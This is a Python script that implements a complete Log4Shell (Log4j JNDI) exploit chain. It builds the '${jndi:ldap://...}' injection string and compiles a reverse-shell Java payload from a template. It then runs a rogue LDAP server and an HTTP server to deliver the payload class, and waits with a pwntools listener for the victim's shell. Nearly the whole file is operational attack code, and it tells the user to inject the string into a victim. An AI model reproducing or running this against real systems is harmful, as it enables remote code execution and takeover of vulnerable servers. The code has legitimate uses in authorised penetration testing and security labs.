# /usr/bin/python

import threading
import ldapserver  # https://uffd.cccv-pages.de/python-ldapserver/master/
import socketserver
import logging
from http.server import SimpleHTTPRequestHandler
from subprocess import call
from pwn import *

logging.basicConfig(level=logging.INFO)

# Change ip and docker tag here
host = "<myip>"
docker_tag = "eclipse-temurin:8u332-b09-jdk"  # jdk8

ldapport = 1389
webport = 8000
shellport = 9001

ldapobject = "dc=a"
jdnistr = f"${{jndi:ldap://{host}:{str(ldapport)}/{ldapobject}}}"
jdniinject = f"http://{host}:{str(webport)}/"

docker_command = "javac Exploit.java"
docker_cmd = f'docker run --rm -v "$PWD":/workdir -w /workdir {docker_tag} {docker_command}'

# Custom schema for jdni
# https://docs.oracle.com/javase/jndi/docs.html
# https://www.ietf.org/rfc/rfc2713.txt
# Extend RFC4519_SCHEMA because it contains required superior attribute types and object classes
RFC2713_ATTRIBUTE_TYPES = [
    # -- Attribute types --
    "( 1.3.6.1.4.1.42.2.27.4.1.6 NAME 'javaClassName' DESC 'Fully qualified name of distinguished Java class or interface' EQUALITY caseExactMatch SYNTAX 1.3.6.1.4.1.1466.115.121.1.15 SINGLE-VALUE )",
    "( 1.3.6.1.4.1.42.2.27.4.1.7 NAME 'javaCodebase' DESC 'URL(s) specifying the location of class definition' EQUALITY caseExactIA5Match SYNTAX 1.3.6.1.4.1.1466.115.121.1.26 )",
    "( 1.3.6.1.4.1.42.2.27.4.1.8 NAME 'javaSerializedData' DESC 'Serialized form of a Java object' SYNTAX 1.3.6.1.4.1.1466.115.121.1.40 SINGLE-VALUE )",
    "( 1.3.6.1.4.1.42.2.27.4.1.10 NAME 'javaFactory' DESC 'Fully qualified Java class name of a JNDI object factory' EQUALITY caseExactMatch SYNTAX 1.3.6.1.4.1.1466.115.121.1.15 SINGLE-VALUE )",
    "( 1.3.6.1.4.1.42.2.27.4.1.11 NAME 'javaReferenceAddress' DESC 'Addresses associated with a JNDI Reference' EQUALITY caseExactMatch SYNTAX 1.3.6.1.4.1.1466.115.121.1.15 )",
    "( 1.3.6.1.4.1.42.2.27.4.1.12 NAME 'javaDoc' DESC 'The Java documentation for the class' EQUALITY caseExactIA5Match SYNTAX 1.3.6.1.4.1.1466.115.121.1.26 )",
    "( 1.3.6.1.4.1.42.2.27.4.1.13 NAME 'javaClassNames' DESC 'Fully qualified Java class or interface name' EQUALITY caseExactMatch SYNTAX 1.3.6.1.4.1.1466.115.121.1.15 )",]
RFC2713_OBJECT_CLASSES = [
    "( 1.3.6.1.4.1.42.2.27.4.2.1 NAME 'javaContainer' DESC 'Container for a Java object' SUP top STRUCTURAL MUST ( cn ) )",
    "( 1.3.6.1.4.1.42.2.27.4.2.4 NAME 'javaObject' DESC 'Java object representation' SUP top ABSTRACT MUST ( javaClassName ) MAY ( javaClassNames $ javaCodebase $ javaDoc $ description ) )",
    "( 1.3.6.1.4.1.42.2.27.4.2.5 NAME 'javaSerializedObject' DESC 'Java serialized object' SUP javaObject AUXILIARY MUST ( javaSerializedData ) )",
    "( 1.3.6.1.4.1.42.2.27.4.2.7 NAME 'javaNamingReference' DESC 'JNDI reference' SUP javaObject AUXILIARY MAY ( javaReferenceAddress $ javaFactory ) )",
    "( 1.3.6.1.4.1.42.2.27.4.2.8 NAME 'javaMarshalledObject' DESC 'Java marshalled object' SUP javaObject AUXILIARY MUST ( javaSerializedData ) )",
]
RFC4512_SCHEMA = ldapserver.schema.RFC4519_SCHEMA.extend(
    attribute_type_definitions=RFC2713_ATTRIBUTE_TYPES,
    object_class_definitions=RFC2713_OBJECT_CLASSES)


def gen_payload_src():
    """Exploit template (from https://github.com/kozmer/log4j-shell-poc)"""
    with open("Exploit-Template.java", "r") as template_file:
        template = template_file.read()

    template = template.replace("HOSTNAMEHERE", host)
    template = template.replace("PORTNUMBERHERE", str(shellport))

    with open("Exploit.java", "w") as exploit_file:
        exploit_file.write(template)


def gen_payload_bin():
    """Generate payload class file from src file"""
    call(docker_cmd, shell=True)


class LDAPRequestHandler(ldapserver.LDAPRequestHandler):
    """LDAP connection logic"""
    subschema = ldapserver.SubschemaSubentry(RFC4512_SCHEMA, 'cn=Subschema')

    # Initial connection
    def do_bind_simple(self, dn='', password=b''):
        super().do_bind_simple()

    def do_search(self, basedn, scope, filterobj):
        # Return reference to web server
        yield self.subschema.ObjectEntry(ldapobject, **{
            'javaClassName': ['Exploit'],
            'javaCodeBase': [jdniinject],
            'objectClass': ['javaNamingReference'],
            'javaFactory': ['Exploit'],
        })


class HTTPRequestHandler(SimpleHTTPRequestHandler):
    """HTTP server which only allows access to the exploit file"""
    def do_HEAD(self) -> None:
        pass

    def do_GET(self) -> None:
        # Only allow http://127.0.0.1:8000/Exploit.class
        if self.path in ["/", "/Exploit.class"]:
            self.path = "/Exploit.class"
            super().do_GET()


if __name__ == '__main__':
    print("Compiling exploit...")
    gen_payload_src()
    gen_payload_bin()

    print("Starting LDAP server...")
    ldap_server = socketserver.TCPServer(('0.0.0.0', ldapport), LDAPRequestHandler)
    ldap_server_thread = threading.Thread(target=ldap_server.serve_forever)
    ldap_server_thread.start()

    print("Starting HTTP server")
    http_server = socketserver.TCPServer(('0.0.0.0', webport), HTTPRequestHandler)
    http_server_thread = threading.Thread(target=http_server.serve_forever)
    http_server_thread.start()

    print("Ready! Inject jdni string to victim.\n")
    print(jdnistr)
    print()
    print(f"Starting reverse shell handler..")

    l = listen(shellport)
    l.wait_for_connection()
    l.interactive()

    # Do proper shutdown to avoid blocked ports
    ldap_server.shutdown()
    http_server.shutdown()

